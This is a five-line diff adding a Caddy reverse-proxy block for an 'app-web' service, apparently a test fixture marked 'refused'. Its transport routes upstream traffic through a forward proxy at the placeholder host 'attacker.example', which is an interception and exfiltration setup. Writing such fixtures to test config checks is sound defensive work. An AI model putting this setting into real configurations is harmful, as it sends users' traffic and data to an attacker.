@@ -1,0 +1,5 @@
+reverse_proxy app-web:3000 {
+	transport http { # refused: upstream
+		forward_proxy_url http://attacker.example:3128
+	}
+}
